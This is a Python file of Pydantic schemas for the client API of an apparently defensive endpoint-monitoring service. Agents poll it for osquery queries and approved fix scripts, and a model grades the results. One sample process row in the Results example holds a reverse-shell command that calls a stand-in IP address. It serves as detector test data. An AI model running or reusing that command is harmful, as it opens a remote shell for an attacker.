"""The shapes of the JSON that goes in and out of the client API.

FastAPI uses these classes to check incoming requests and to build the
Swagger docs at http://localhost:8080/docs. If you want to add a field,
add it here first.
"""

from typing import Any, Literal

from pydantic import BaseModel, ConfigDict

OS = Literal["linux", "windows"]
Shell = Literal["bash", "powershell"]
Verdict = Literal["benign", "suspicious", "malicious"]


# ----- Who is calling (filled in by auth.py from the database) ----------------------


class Client(BaseModel):
    client_id: str
    os: OS
    hostname: str


# ----- Registering a new client --------------------------------------------------


class RegisterRequest(BaseModel):
    hostname: str
    os: OS
    os_version: str | None = None
    agent_version: str | None = None
    system_information: dict | None = None


class RegisterResponse(BaseModel):
    client_id: str  # save this and send it as X-Client-Id on every request


# ----- What the client gets when it polls ---------------------------------------


class Query(BaseModel):
    """An osquery SQL query the client should run."""

    name: str  # short id, e.g. "processes"; the client sends it back with the rows
    sql: str


class Script(BaseModel):
    """An approved fix script the client should run."""

    id: int  # report the result to POST /api/v1/remediations/{id}/result
    shell: Shell
    script: str  # multi-line: save it to a file and run the file


class PollResponse(BaseModel):
    model_config = ConfigDict(json_schema_extra={"examples": [{
        "poll_interval": 300,
        "queries": [
            {"name": "processes", "sql": "SELECT pid, parent, name, path, cmdline, uid, on_disk FROM processes"},
            {"name": "cron_jobs", "sql": "SELECT command, path FROM crontab"},
        ],
        "scripts": [
            {"id": 3, "shell": "bash", "script": "#!/usr/bin/env bash\necho 'Boombox test script'\n"},
        ],
    }]})

    poll_interval: int  # seconds to wait before polling again
    queries: list[Query]  # run all of these, then POST the rows to /api/v1/results
    scripts: list[Script]  # approved fix scripts: run each, then report the result


# ----- What the client sends back -----------------------------------------------


class QueryResult(BaseModel):
    name: str  # the Query.name this result belongs to
    rows: list[dict[str, Any]] = []  # rows exactly as `osqueryi --json` prints them
    error: str | None = None  # set this instead of rows if the query failed


class Results(BaseModel):
    """The client doesn't say who it is in the body; that comes from auth.py."""

    model_config = ConfigDict(json_schema_extra={"examples": [{
        "results": [
            {"name": "processes", "rows": [
                {"pid": "1020", "parent": "1", "name": "nginx", "path": "/usr/sbin/nginx", "cmdline": "nginx: worker process"},
                {"pid": "4242", "parent": "1020", "name": "bash", "path": "/usr/bin/bash",
                 "cmdline": "bash -c bash -i >& /dev/tcp/203.0.113.7/4444 0>&1"},
            ]},
            {"name": "cron_jobs", "rows": []},
            {"name": "admin_users", "error": "osquery said: no such table"},
        ],
    }]})

    results: list[QueryResult]


class ScriptResult(BaseModel):
    exit_code: int  # 0 means it worked
    output: str  # what the script printed


# ----- What the pipeline produces -----------------------------------------------


class Finding(BaseModel):
    """One row the decision model didn't like."""

    query: str
    row: dict[str, Any]
    verdict: Literal["suspicious", "malicious"]
    confidence: float  # 0.0 - 1.0


class Decision(BaseModel):
    verdict: Verdict  # the worst verdict of all findings, or "benign"
    findings: list[Finding]
